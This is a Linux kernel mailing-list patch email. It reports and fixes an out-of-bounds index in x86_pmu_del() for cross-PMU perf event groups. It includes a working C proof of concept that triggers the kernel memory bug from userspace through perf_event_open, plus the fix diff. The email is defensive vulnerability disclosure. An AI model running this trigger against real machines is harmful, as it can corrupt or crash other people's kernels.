Received: from mail-dy1-f173.google.com (mail-dy1-f173.google.com [74.125.82.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BACA41D88A4
	for <linux-perf-users@vger.kernel.org>; Mon,  9 Mar 2026 01:42:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.173
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1773020545; cv=none; b=MMAmRFSTmswF1lwWn2Cgjbgg7gfsVzCo5BtoHHrMYO5wXCDEcD476Oi9gaqz5dBX5aXLkT6K1pSvpVAXwfKgIHCwWBWemJDuqjuahegxaLkp/oJ6A1wRWHMy56MvsSUqolV04R2JBbWexCB2JCfrPUyB3kB0BbOK2ENioTdALbA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1773020545; c=relaxed/simple;
	bh=7eIRj2vMmWqWMoz7ARzhm3Vzc/DWOI+G7T8MQ6zGMtE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=BFYTIwxPeKSS6d0MH20R9kA7aXfagxgEakXSIAvQfGhpAjezvhMUZ3eJ00NYiWHyrAtVyR921S8aWP+s5TKQrxNrsI5SEpy/95nbWYNpyYplbPY2H7Bo2EHgNkRJiFuVVFbOGgpXN1XfCm9R8kpgKy4qkpGIIB/HfL0gKZsNtJA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=kv7uWuCa; arc=none smtp.client-ip=74.125.82.173
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="kv7uWuCa"
Received: by mail-dy1-f173.google.com with SMTP id 5a478bee46e88-2b4520f6b32so12794441eec.0
        for <linux-perf-users@vger.kernel.org>; Sun, 08 Mar 2026 18:42:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1773020543; x=1773625343; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to;
        bh=PUaRsNVwFauHrwZp2JYwojAS9B/lt2+UrlKTaGTgnNQ=;
        b=kv7uWuCaIam9J6WC4zuL1b9Eu9Dk9L0xRFjOnwp3tR224KRLJVmYQfaIiZbgy6k2hZ
         ovNFTVAY3wzBYCrtdHH4F7k09FBjrR7zqOQlhSvz0yzZgayAU4P/jzpmQpVvTLgBPLlL
         GZVb0awOqE+waEm87qsKeM+t8GVoiToLIh9VSCcohPgKV8pyACkhyyqdJXEea2796Ttc
         rAnbhNqFtK5pVJP5sJV+HV8R9/KcSkPDVVbEVFvms5uf+3ZExJ1HTayL3yRb9AbmcWgs
         oJs6vSt8eLbI+u31zu3Kn9obq+L7GbscWXNPI7dZas7/9YZMYGwURW6QdoEIyanrABn4
         V3rA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1773020543; x=1773625343;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=PUaRsNVwFauHrwZp2JYwojAS9B/lt2+UrlKTaGTgnNQ=;
        b=VTLmmeGUpMpAwfLBVPAk6BGKBrjNd6fM6nXLOZ6QrW47LihtpYQVdL/8t2b9ltED/w
         MuRMOWW7eF1oUPu0G39w9PoX0L98Rv8H4BEAIZfWhaNmUoMZ9lRd6jASX2db4NJLvNRB
         RnpDQmc81zyp3UVo94+vM2nmkzVmOK2/jn0XEX72G6XI9EkP8NNiDeeR2osIGjhBEFk1
         Dv/e8ZSbtVPTssLSxfN/ocisWXLtATC2nH8bemGnf4wv/ldpRGqGAYDLt302wF5Eq5hw
         cOG8yN3xXKOwMJzKRY9G+ICaIJ4s9/11YFNhYerYcbQdn8Gb48MoeP6bY5rgdEHW4E9s
         jUkQ==
X-Forwarded-Encrypted: i=1; AJvYcCUVO/FaFdkJT90IaI4BTCeKN+rVrZ+L2yZsfoxZIhNDvkS9IevgrR/r+4q+nhxFMvj+yXzKyHA3JxA+9CBp3QJD@vger.kernel.org
X-Gm-Message-State: AOJu0YykMe45RpIGYGzItuQx6FQkBlt3Ed6HaC2kj/Ao2MztqPPvKv9S
	NHIymR9MiQTEPstKinsBJzyySTi+YQ/4B0ywmIIfO8UynHaz0//jMMMb
X-Gm-Gg: ATEYQzyIVvqOX7WXyV3vK/tAPvCiCt5Zes4SIeoc4unzfIHD3NVzgqYKfKYS5weUWv5
	HGhX30swt0fft4s8FNNUk8zTxPXk2XXP0jBDTES+6JrW2F2B1O2/dwz+CogTx+6TkOJhe1HWJa8
	y7myCBeA1NnbqlLxNfrVBLzJrLAwtNJaFMv9S2Mv3qWveqecwl4Of8K9uSn13XJLQxDFR0TlVw9
	/FDiJ/hU0v0ARHE7DRV8dzan60gDSrhWbOmsSbEIo7ggI187/8u2fbOUCKjqcmZmm6ByHMSxDCo
	SUYTWP1ssjRuPhkHMrjd0/keR3H+KiceXa0ZzxD9448pINKfEf6gHzZmCIAKN3/BP18ub5YvyG3
	8H+yzPyGLErLZixOwH7cXLid1SX4jmIpyvK5XIRXDlEjxPWAwaXp3JR4kg0UboDGgF1tWPRlP6r
	1xHOgw9OgQk3JEdaG305bjwCm268cGi3/wcFivIRaYB+rdObY=
X-Received: by 2002:a05:7300:cd90:b0:2ba:8496:498 with SMTP id 5a478bee46e88-2be4de8e32amr3293507eec.7.1773020542692;
        Sun, 08 Mar 2026 18:42:22 -0700 (PDT)
Received: from homelab.. (ip72-200-102-19.tc.ph.cox.net. [72.200.102.19])
        by smtp.googlemail.com with ESMTPSA id 5a478bee46e88-2be6df8a348sm1367736eec.30.2026.03.08.18.42.21
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 08 Mar 2026 18:42:21 -0700 (PDT)
From: Oliver Rosenberg <olrose55@gmail.com>
To: 
Cc: olrose55@gmail.com,
	Peter Zijlstra <peterz@infradead.org>,
	Ingo Molnar <mingo@redhat.com>,
	Arnaldo Carvalho de Melo <acme@kernel.org>,
	Namhyung Kim <namhyung@kernel.org>,
	Mark Rutland <mark.rutland@arm.com>,
	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
	Jiri Olsa <jolsa@kernel.org>,
	Ian Rogers <irogers@google.com>,
	Adrian Hunter <adrian.hunter@intel.com>,
	James Clark <james.clark@linaro.org>,
	Thomas Gleixner <tglx@kernel.org>,
	Borislav Petkov <bp@alien8.de>,
	Dave Hansen <dave.hansen@linux.intel.com>,
	x86@kernel.org,
	"H. Peter Anvin" <hpa@zytor.com>,
	Ravi Bangoria <ravi.bangoria@amd.com>,
	linux-perf-users@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH] perf_events: fix array-index-out-of-bounds in x86_pmu_del
Date: Sun,  8 Mar 2026 18:41:30 -0700
Message-ID: <20260309014215.3871484-1-olrose55@gmail.com>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-perf-users@vger.kernel.org
List-Id: <linux-perf-users.vger.kernel.org>
List-Subscribe: <mailto:linux-perf-users+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-perf-users+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Vulnerability Description:
There exists a KASAN:wild-memory-access and an array-index-out-of-bounds
(-1 index) in x86_pmu_del(). When a cross-PMU event group is created
where the group leader is a PMU type that does not have txn implemented
then the cpuc->txn_flags for the siblings are not set because only the
group leader's pmu->start_txn() is called and in the case of not being
implemented it is set to perf_pmu_nop_txn(). The events are still attempted
to be processed as a group, when one of the x86 PMUs errors out,
cpuc->txn_flags is not set and event->hw.idx is not set. The x86_pmu_del()
function expects event->hw.idx not to be set when events are batched and
not yet enabled during a transaction so the function checks the
cpuc->txn_flags to skip the array-index-out-of-bounds. However, when an
event errors out and the group events are not enable here, cpuc->txn_flags
is not set and event->hw.idx is -1 so we do not skip the uses of
event->hw.idx which causes an array-index-out-of-bounds.

Vulnerability Reproduction (POC):
static int peo(struct perf_event_attr *a, int g) {
        return syscall(__NR_perf_event_open, a, 0, -1, g, 0);
}

int main(void) {
        struct perf_event_attr raw = {}, bp = {};
        int fds[64], n = 0, leader;

        raw.type = PERF_TYPE_RAW;
        raw.size = sizeof(raw);
        raw.config = 0x76;
        raw.exclude_kernel = 1;

        leader = peo(&raw, -1);
        if (leader < 0) return 1;
        while (n < 64 && (fds[n] = peo(&raw, leader)) >= 0) n++;
        for (int i = 0; i < n; i++) close(fds[i]);
        close(leader);
        if (n <= 0) return 1;

        bp.type = PERF_TYPE_BREAKPOINT;
        bp.size = sizeof(bp);
        bp.bp_type = 4;
        bp.bp_len = sizeof(long);
        bp.exclude_kernel = 1;
        bp.inherit = 1;
        leader = peo(&bp, -1);
        if (leader < 0) return 1;

        raw.inherit = 1;
        if (peo(&raw, leader) < 0 || peo(&raw, leader) < 0) return 1;

        for (int i = 0; i < n; i++)
                if (peo(&raw, -1) < 0) return 1;

        if (fork() == 0) _exit(0);
        wait(NULL);
        return 0;
}

POC Explanation:
The POC first fills the CPUs PMU events with x86 raw PMU events (type 4) to
set up the group scheduling to fail and trigger the bug, it then creates a
cross-PMU group with BREAKPOINT (type 5) as the group leader and 2 x86 raw
PMU siblings. The first sibling is added but batched and not enabled, the
second sibling fails on add because we exceed the max number of PMU events
for the cpu. This triggers the cleanup of the first sibling for which
cpu->txn_flags is not set and event->hw.idx=-1 since sibling 1 was not
enabled. This triggers the bug when event->hw.idx is used as an
array-index-out-of-bounds in x86_pmu_del().

Suggested Fix:
The suggested fix is to add a check in x86_pmu_del() to verify
event->hw.idx is set before using the value. If it is not set then jump
over the use of event->hw.idx and proceed with cleanup.

Fixes: bd2756811766 ("perf: Rewrite core context handling")
Signed-off-by: Oliver Rosenberg <olrose55@gmail.com>
---

Notes:
    This patch fixes the symptom and prevents the array-index-out-of-bounds
    caused by the dangerous use of hw->idx when it is not set. I was not sure
    if it may make sense to also solve the root cause of the issue which is
    cpuc->txn_flags not being set for PMU events in a group where the group
    leader does not implement transactions, or if this would require a redesign
    to how group events are process and have potential performance
    degredations.

 arch/x86/events/core.c | 5 +++++
 1 file changed, 5 insertions(+)

diff --git a/arch/x86/events/core.c b/arch/x86/events/core.c
index 03ce1bc7e..7474b2d66 100644
--- a/arch/x86/events/core.c
+++ b/arch/x86/events/core.c
@@ -1655,6 +1655,9 @@ static void x86_pmu_del(struct perf_event *event, int flags)
 	if (cpuc->txn_flags & PERF_PMU_TXN_ADD)
 		goto do_del;
 
+	if (event->hw.idx < 0)
+		goto remove_from_list;
+
 	__set_bit(event->hw.idx, cpuc->dirty);
 
 	/*
@@ -1663,6 +1666,8 @@ static void x86_pmu_del(struct perf_event *event, int flags)
 	x86_pmu_stop(event, PERF_EF_UPDATE);
 	cpuc->events[event->hw.idx] = NULL;
 
+remove_from_list:
+
 	for (i = 0; i < cpuc->n_events; i++) {
 		if (event == cpuc->event_list[i])
 			break;
-- 
2.43.0

